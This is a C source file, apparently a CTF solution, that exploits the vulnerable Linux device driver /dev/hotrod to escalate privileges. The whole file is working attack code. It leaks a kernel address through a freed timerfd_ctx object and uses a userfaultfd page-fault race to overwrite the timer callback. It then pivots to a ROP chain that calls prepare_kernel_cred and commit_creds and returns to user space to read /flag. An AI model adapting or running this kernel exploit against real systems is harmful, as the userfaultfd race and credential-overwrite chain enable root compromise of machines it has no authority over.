#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <sys/timerfd.h>

#define DEVICE_PATH "/dev/hotrod"

#define ALLOC 0xBAADC0DE
#define FREE 0xC001C0DE
#define SHOW 0x1337C0DE
#define EDIT 0xDEADC0DE

#define PAGE_SIZE 0x1000

static int fd, ufd;
static unsigned long size = 0xf0;
static unsigned char buff[0xf0];
static unsigned long kernel_base, leak, timerfd_ctx, pivot, usr_cs, usr_ss, usr_rflags;
static void *page;

struct request
{
  unsigned long size;
  unsigned char *buff;
};


void hexdump(unsigned char *buff, unsigned long size)
{
    int i,j;

    for (i = 0; i < size/8; i++)
    {
      if ((i % 2) == 0)
      {
        if (i != 0)
            printf("  \n");

        printf("  %04x  ", i*8);
      }

      unsigned long ptr = ((unsigned long *)(buff))[i];
      printf("0x%016lx", ptr);
      printf("    ");

    }
    printf("\n");
}


static void save_state()
{
	__asm__ __volatile__(
	"movq %0, cs;"
	"movq %1, ss;"
	"pushfq;"
	"popq %2;"
	: "=r" (usr_cs), "=r" (usr_ss), "=r" (usr_rflags) : : "memory" );
}



void read_flag()
{
	char flag[100];
	read(open("/flag", O_RDONLY), flag, 100);
	puts(flag);
}


void do_alloc(unsigned long size)
{
  ioctl(fd, ALLOC, size);
}


void do_free(int fd)
{
  ioctl(fd, FREE);
}


void do_show(unsigned char *dest, unsigned long size)
{
  struct request req;

  req.size = size;
  req.buff = dest;

  ioctl(fd, SHOW, &req);
}


void do_edit(unsigned char *src, unsigned long size)
{
  struct request req;

  req.size = size;
  req.buff = src;

  ioctl(fd, EDIT, &req);
}


int create_timer(int leak)
{
	struct itimerspec its;

	its.it_interval.tv_sec = 0;
	its.it_interval.tv_nsec = 0;
	its.it_value.tv_sec = 10;
	its.it_value.tv_nsec = 0;

	int tfd = timerfd_create(CLOCK_REALTIME, 0);
	timerfd_settime(tfd, 0, &its, 0);

	if (leak)
	{
		close(tfd);
		sleep(1);
		return 0;
	}
}


int userfaultfd(int flags)
{
	return syscall(SYS_userfaultfd, flags);
}


int initialize_ufd() {

  int fd;

  puts("[*] Mmapping page...");
  page = mmap((void *)0xdead000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);

  struct uffdio_register reg;

  if ((fd = userfaultfd(O_NONBLOCK)) == -1)
  {
		perror("[ERROR] Userfaultfd failed");
		exit(-1);
	}

   struct uffdio_api api = { .api = UFFD_API };

  if (ioctl(fd, UFFDIO_API, &api))
  {
		perror("[ERROR] ioctl - UFFDIO_API failed");
		exit(-1);
	}

  if (api.api != UFFD_API)
  {
		puts("[ERROR] Unexepcted UFFD api version!");
		exit(-1);
	}

  printf("[*] Start monitoring range: %p - %p\n", page, page + PAGE_SIZE);

  reg.mode = UFFDIO_REGISTER_MODE_MISSING;
  reg.range.start = (long)(page);
  reg.range.len = PAGE_SIZE;

  if (ioctl(fd, UFFDIO_REGISTER,  &reg))
  {
		perror("[ERROR] ioctl - UFFDIO_REGISTER failed");
		exit(-1);
	}

  return fd;

}


void *page_fault_handler(void *_ufd)
{
  struct pollfd pollfd;
  struct uffd_msg fault_msg;
  struct uffdio_copy ufd_copy;

  int ufd = *((int *) _ufd);

  pollfd.fd = ufd;
  pollfd.events = POLLIN;

  while (poll(&pollfd, 1, -1) > 0)
  {

    if ((pollfd.revents & POLLERR) || (pollfd.revents & POLLHUP))
    {
      perror("[ERROR] Polling failed");
      exit(-1);
    }

    if (read(ufd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg))
    {
      perror("[ERROR] Read - fault_msg failed");
      exit(-1);
    }

    char *page_fault_location = (char *)fault_msg.arg.pagefault.address;

    if (fault_msg.event != UFFD_EVENT_PAGEFAULT || (page_fault_location != page && page_fault_location != page + PAGE_SIZE))
    {
      perror("[ERROR] Unexpected pagefault?");
      exit(-1);
    }

    if (page_fault_location == (void *)0xdead000)
    {
      printf("[+] Page fault at address %p!\n", page_fault_location);

      puts("[*] Freeing...");
      do_free(fd);

      puts("[*] Creating second timer...");
      create_timer(0);

      void *fake_stack = mmap((void *)0xcafe000, PAGE_SIZE*5, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_POPULATE|MAP_PRIVATE, 0, 0);

      ((unsigned long *)(buff))[0x0] = (unsigned long)(fake_stack + 0x800);
      ((unsigned long *)(buff))[0x3] = 0x000000000eae0e65;
      ((unsigned long *)(buff))[0x4] = 0x000000000eae0e65;
      ((unsigned long *)(buff))[0x5] = (unsigned long)(pivot);

      puts("[*] Structure will be overwritten with: ");
      hexdump(buff, size);

      unsigned long *rop = (unsigned long *)(fake_stack + 0x800);

      *rop ++= kernel_base + 0xffffffff810b689dUL; // pop rdi; ret;
      *rop ++= 0;
      *rop ++= kernel_base + 0xffffffff81053680UL; // pkc
      *rop ++= kernel_base + 0xffffffff8108bacaUL; // mov rdi, rax; call 0x2d1350; mov rax, -9; pop rbp; ret;
      *rop ++= 0;
      *rop ++= kernel_base + 0xffffffff810537d0UL; // cc
      *rop ++= kernel_base + 0xffffffff8118a8d3UL; // pop rcx; ret;
      *rop ++= (unsigned long)(read_flag);
      *rop ++= kernel_base + 0xffffffff81008b7dUL; // pop r11; pop r12; pop rbp; ret;
      *rop ++= usr_rflags;
      *rop ++= 0; // r12
      *rop ++= 0; // rbp
      *rop ++= kernel_base + 0xffffffff81200106UL; // kpti_trampoline (sysret)
      *rop ++= 0; // rax
      *rop ++= 0; // rdi
      *rop ++= (unsigned long)(fake_stack + 0x1000); // rsp

      sleep(1.7);

      ufd_copy.dst = (unsigned long)0xdead000;
      ufd_copy.src = (unsigned long)(&buff);
      ufd_copy.len = PAGE_SIZE;
      ufd_copy.mode = 0;
      ufd_copy.copy = 0;


      if (ioctl(ufd, UFFDIO_COPY, &ufd_copy) < 0)
      {
        perror("ioctl(UFFDIO_COPY)");
        exit(-1);
      }

      exit(0);

    }
  }
}


int main(void)
{
  pthread_t tid;

  fd = open(DEVICE_PATH, O_RDONLY);

  save_state();

  puts("[*] Allocating/Freeing timerfd_ctx structure...");
  create_timer(1);

  puts("[*] Leaking timerfd_tmrproc address...");
  do_alloc(size);
  do_show(buff, size);

  puts("[+] Object dump: ");
  hexdump(buff, size);

  leak = ((unsigned long *)(buff))[0x5];
  timerfd_ctx = ((unsigned long *)(buff))[0];
  kernel_base = leak - 0x81102a00UL + 0x100000000UL;
  pivot = kernel_base + 0xffffffff81027b86UL;

  printf("[+] Leaked timerfd_ctx structure address: 0x%lx\n", timerfd_ctx);
  printf("[+] Leaked timerfd_tmrproc address: 0x%lx\n", leak);
  printf("[+] Kernel base address: 0x%lx\n", (0xffffffff00000000UL + kernel_base));

  int ufd = initialize_ufd();
  pthread_create(&tid, NULL, page_fault_handler, &ufd);

  puts("[*] Triggering page fault...");
  do_edit(page, size);

  pthread_join(tid, NULL);

}
